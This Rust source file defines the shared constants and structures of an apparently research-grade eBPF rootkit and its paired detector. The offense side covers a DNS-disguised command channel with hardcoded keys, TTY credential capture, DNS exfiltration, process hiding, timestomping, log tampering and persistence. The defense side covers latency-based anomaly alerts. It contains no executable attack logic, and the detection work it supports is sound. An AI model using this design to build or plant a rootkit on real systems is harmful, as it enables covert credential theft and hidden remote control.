#![no_std]
// When building for user-space, std is available via the `user` feature.
// When building for kernel (eBPF), we stay no_std.

/// Maximum number of PIDs that can be hidden simultaneously.
pub const MAX_HIDDEN_PIDS: u32 = 64;

/// Maximum entries in the command map.
pub const MAX_COMMANDS: u32 = 16;

/// Maximum number of TTY file descriptors to monitor for credential harvesting.
pub const MAX_TTY_FDS: u32 = 128;

/// Maximum DNS exfiltration chunk size in bytes (fits in a DNS label).
pub const DNS_EXFIL_CHUNK_SIZE: usize = 63;

/// Spoofed parent PID to use for ancestry spoofing (init process).
pub const SPOOFED_PPID: u32 = 1;

/// ChaCha20 nonce size in bytes.
pub const CHACHA20_NONCE_LEN: usize = 12;

/// ChaCha20 key for encrypted C2 (research-grade, 256-bit).
pub const C2_CHACHA20_KEY: [u8; 32] = [
    0x41, 0x45, 0x47, 0x49, 0x53, 0x2D, 0x53, 0x48, 0x41, 0x44, 0x4F, 0x57, 0x2D, 0x43, 0x48, 0x41,
    0x43, 0x48, 0x41, 0x32, 0x30, 0x2D, 0x4B, 0x45, 0x59, 0x2D, 0x30, 0x30, 0x30, 0x30, 0x30, 0x31,
]; // "AEGIS-SHADOW-CHACHA20-KEY-000001"

/// Magic bytes used to identify C2 packets in XDP.
/// The XDP program checks the first 4 bytes of UDP payload against this.
pub const MAGIC_BYTES: [u8; 4] = [0xDE, 0xAD, 0xBE, 0xEF];

/// Default UDP port for C2 communication.
pub const C2_PORT: u16 = 53; // Disguised as DNS

/// HMAC shared secret for C2 authentication (research-grade).
/// In a real scenario this would be derived from a key exchange.
/// The XDP program validates the HMAC before accepting any C2 command.
pub const C2_HMAC_KEY: [u8; 16] = [
    0x41, 0x45, 0x47, 0x49, 0x53, 0x2D, 0x53, 0x48, 0x41, 0x44, 0x4F, 0x57, 0x4B, 0x45, 0x59, 0x31,
]; // "AEGIS-SHADOWKEY1"

/// HMAC digest length appended to C2 packets.
pub const C2_HMAC_LEN: usize = 16; // Truncated HMAC-SHA256

/// BPF pin path for persistence.
pub const BPF_PIN_PATH: &str = "/sys/fs/bpf/shadow";

/// Latency threshold multiplier for defense (1.3 = 30% above baseline).
/// NOTE: This constant is for user-space reference only. The eBPF program
/// uses integer math (multiply by 13, divide by 10) since floating-point
/// is unavailable in kernel BPF. If you change this value, update the
/// integer math in defense-ebpf/src/main.rs accordingly.
pub const LATENCY_THRESHOLD_MULTIPLIER: f64 = 1.3;

/// Baseline calibration duration in seconds.
pub const BASELINE_DURATION_SECS: u64 = 10;

// ──────────────────────────────────────────────
// Shared Structures (used by both eBPF and user-space)
// ──────────────────────────────────────────────

/// Configuration for the rootkit, stored in a BPF HashMap.
/// Key: 0 (singleton). Value: this struct.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct RootkitConfig {
    /// PID of the rootkit loader process (to self-exclude from hooks).
    pub self_pid: u32,
    /// Whether process hiding is active.
    pub hide_procs: u8,
    /// Whether network stealth is active.
    pub net_stealth: u8,
    /// Whether file obfuscation is active.
    pub file_obfuscate: u8,
    /// Whether telemetry muting is active.
    pub mute_telemetry: u8,
    /// Padding for alignment.
    pub _pad: [u8; 4],
}

/// Payload received via XDP C2 channel.
/// Extracted from UDP packets matching MAGIC_BYTES.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CommandPayload {
    /// Command type: 1=hide_pid, 2=unhide_pid, 3=obfuscate_file, 4=exfil, 5=kill_switch
    pub cmd_type: u32,
    /// Argument (e.g., PID to hide, or first 4 bytes of filename hash).
    pub arg1: u32,
    /// Secondary argument.
    pub arg2: u32,
    /// Padding.
    pub _pad: u32,
}

/// Unified event header for both offense and defense reporting.
/// Sent from eBPF to user-space via PerfEventArray or RingBuf.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct EventHeader {
    /// Event type (see EventType constants below).
    pub event_type: u32,
    /// PID that triggered the event.
    pub pid: u32,
    /// Timestamp in nanoseconds (from bpf_ktime_get_ns).
    pub timestamp_ns: u64,
    /// Additional context (meaning depends on event_type).
    pub context: u64,
}

// Event type constants
pub const EVENT_PROC_HIDDEN: u32 = 1;
pub const EVENT_PACKET_INTERCEPTED: u32 = 2;
pub const EVENT_FILE_OBFUSCATED: u32 = 3;
pub const EVENT_TELEMETRY_MUTED: u32 = 4;
pub const EVENT_PERSISTENCE_SET: u32 = 5;
pub const EVENT_KILL_SWITCH: u32 = 6;
pub const EVENT_C2_AUTH_FAILED: u32 = 7;
pub const EVENT_CRED_CAPTURED: u32 = 8;
pub const EVENT_LOG_TAMPERED: u32 = 9;
pub const EVENT_ANCESTRY_SPOOFED: u32 = 10;
pub const EVENT_DNS_EXFIL: u32 = 11;
pub const EVENT_KALLSYMS_HIDDEN: u32 = 12;
pub const EVENT_ANTI_DETACH: u32 = 13;
pub const EVENT_TIMESTOMPED: u32 = 14;

// Defense event types (100+)
pub const EVENT_GHOST_MAP_FOUND: u32 = 100;
pub const EVENT_LATENCY_ANOMALY: u32 = 101;
pub const EVENT_DANGEROUS_HELPER: u32 = 102;
pub const EVENT_UNAUTHORIZED_HOOK: u32 = 103;
pub const EVENT_HIDDEN_PROCESS: u32 = 104;
pub const EVENT_ROGUE_NET_ATTACH: u32 = 105;

/// Syscall identifiers for multi-syscall latency monitoring.
pub const SYSCALL_GETDENTS64: u32 = 0;
pub const SYSCALL_READ: u32 = 1;
pub const SYSCALL_WRITE: u32 = 2;
pub const SYSCALL_GETATTR: u32 = 3;
pub const SYSCALL_SYSLOG: u32 = 4;

/// Alert structure used by the defense module.
/// Sized at 48 bytes to fit eBPF perf event constraints.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct DefenseAlert {
    /// Alert type (ALERT_* constants).
    pub alert_type: u32,
    /// Severity: 1=Low, 2=Medium, 3=High, 4=Critical.
    pub severity: u32,
    /// PID that triggered the alert.
    pub pid: u32,
    /// Padding for 8-byte alignment.
    pub _pad: u32,
    /// Timestamp in nanoseconds (from bpf_ktime_get_ns).
    pub timestamp_ns: u64,
    /// Additional context (meaning depends on alert_type).
    pub context: u64,
    /// Extra details (e.g., latency bytes for ALERT_SYSCALL_LATENCY).
    pub details: [u8; 16],
}

/// Latency measurement stored in PerCpuHashMap.
/// Key: composite key encoding tgid + syscall_id.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct LatencyEntry {
    /// Timestamp when syscall entered (bpf_ktime_get_ns).
    pub entry_ns: u64,
    /// Which syscall this entry tracks (SYSCALL_* constant).
    pub syscall_id: u32,
    /// Padding.
    pub _pad: u32,
}

/// Baseline latency measurement for defense syscall monitoring.
/// Key: syscall_nr (u32). Value: this struct.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct LatencyBaseline {
    /// Running average latency in nanoseconds.
    pub avg_latency_ns: u64,
    /// Number of samples used to compute the average.
    pub sample_count: u32,
    /// Padding.
    pub _pad: u32,
}

/// Rate-limiter state per CPU for defense alerts.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct RateLimitEntry {
    /// Timestamp of the last alert emitted (bpf_ktime_get_ns).
    pub last_alert_ns: u64,
}

/// Configuration for defense latency threshold, writable from user-space.
/// Key: 0 (singleton). Value: this struct.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct ThresholdConfig {
    /// Threshold numerator (default 13 = 130% of baseline, i.e., 30% above).
    pub numerator: u32,
    /// Threshold denominator (default 10).
    pub denominator: u32,
}

// Defense alert type constants (used by defense-ebpf and defense user-space)
pub const ALERT_GHOST_MAP: u32 = 1;
pub const ALERT_SYSCALL_LATENCY: u32 = 2;
pub const ALERT_BYTECODE_TAMPER: u32 = 3;
pub const ALERT_HIDDEN_PROCESS: u32 = 4;
pub const ALERT_SUSPICIOUS_HOOK: u32 = 5;

/// Minimum interval between alerts per-CPU in nanoseconds.
/// Default: 100ms = 100_000_000ns.
pub const ALERT_RATE_LIMIT_NS: u64 = 100_000_000;

/// Credential capture event sent from eBPF to user-space.
/// Contains a fragment of captured keystroke/write data from TTY devices.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct CredentialCapture {
    /// PID of the process writing to TTY.
    pub pid: u32,
    /// File descriptor being written to.
    pub fd: u32,
    /// Number of valid bytes in `data`.
    pub data_len: u32,
    /// Padding.
    pub _pad: u32,
    /// Captured data (up to 64 bytes per event).
    pub data: [u8; 64],
}

/// DNS exfiltration request. User-space populates this map,
/// and the TC eBPF program encodes the data into DNS query labels.
#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct DnsExfilChunk {
    /// Chunk sequence number.
    pub seq: u32,
    /// Number of valid bytes in `data`.
    pub data_len: u32,
    /// Data to exfiltrate (encoded as hex in DNS labels).
    pub data: [u8; 64],
}

/// Timestamp override entry for timestomping.
/// Key: inode number (u64). Value: this struct.
#[repr(C)]
#[derive(Clone, Copy, Debug, PartialEq)]
pub struct TimestompEntry {
    /// Fake mtime in seconds since epoch.
    pub fake_mtime_sec: u64,
    /// Fake atime in seconds since epoch.
    pub fake_atime_sec: u64,
    /// Fake ctime in seconds since epoch.
    pub fake_ctime_sec: u64,
}

// ──────────────────────────────────────────────
// Safety: All structs above are plain-old-data (POD) types.
// They contain no pointers, no references, and no Drop impls.
// They are safe to transmit between kernel and user-space via BPF maps.
// ──────────────────────────────────────────────

#[cfg(feature = "user")]
unsafe impl aya::Pod for RootkitConfig {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for CommandPayload {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for EventHeader {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for DefenseAlert {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for LatencyEntry {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for LatencyBaseline {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for RateLimitEntry {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for ThresholdConfig {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for CredentialCapture {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for DnsExfilChunk {}

#[cfg(feature = "user")]
unsafe impl aya::Pod for TimestompEntry {}
